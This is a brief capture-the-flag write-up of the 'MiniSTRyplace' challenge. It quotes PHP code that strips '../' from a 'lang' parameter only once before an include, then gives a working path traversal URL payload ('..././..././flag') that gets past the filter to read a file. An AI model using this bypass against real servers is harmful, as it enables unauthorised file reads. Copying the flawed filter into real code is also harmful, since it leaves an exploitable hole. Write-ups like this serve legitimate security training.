# MiniSTRyplace
![[Pasted image 20210423174607.png]]

## Analyzing Source Code
There appears to be a lang parameter. The PHP code does not do _str_replace_ recursively. 
```php
...snip...
 $lang = ['en.php', 'qw.php'];
        include('pages/' . (isset($_GET['lang']) ? str_replace('../', '', $_GET['lang']) : $lang[array_rand($lang)]));
    ?>
    </body>
...snip...
```

## Exploitation

This will allow us to put _../_ within one another and after the string replace does it job, we will have the correct path.
```url
http://188.166.145.178:31116/?lang=..././..././flag
```